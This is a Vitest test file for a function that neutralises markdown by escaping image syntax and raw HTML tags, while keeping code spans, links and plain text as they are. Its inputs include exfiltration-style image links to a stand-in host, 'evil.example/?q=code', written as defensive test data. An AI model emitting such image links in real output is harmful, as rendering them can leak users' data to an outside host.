import { describe, expect, it } from 'vitest';
import { neutralizeMarkdown } from './markdown';

describe('neutralizeMarkdown', () => {
  it('turns images into links', () => {
    expect(neutralizeMarkdown('see ![x](https://evil.example/?q=code) and ![y][ref]')).toBe(
      'see \\![x](https://evil.example/?q=code) and \\![y][ref]',
    );
  });

  it('shows HTML tags as text', () => {
    expect(neutralizeMarkdown('<img src="https://evil.example/a.png"> a < b')).toBe(
      '&lt;img src="https://evil.example/a.png"> a < b',
    );
  });

  it('keeps inline code and code blocks as they are', () => {
    const text = 'use `![a](b)` or `<div>`\n```html\n<img src="x">\n![a](b)\n```\n![c](d)';
    expect(neutralizeMarkdown(text)).toBe(
      'use `![a](b)` or `<div>`\n```html\n<img src="x">\n![a](b)\n```\n\\![c](d)',
    );
  });

  it('keeps links and ordinary text', () => {
    const text = '**Bold** [docs](https://example.com) - item\n\n1. step';
    expect(neutralizeMarkdown(text)).toBe(text);
  });
});
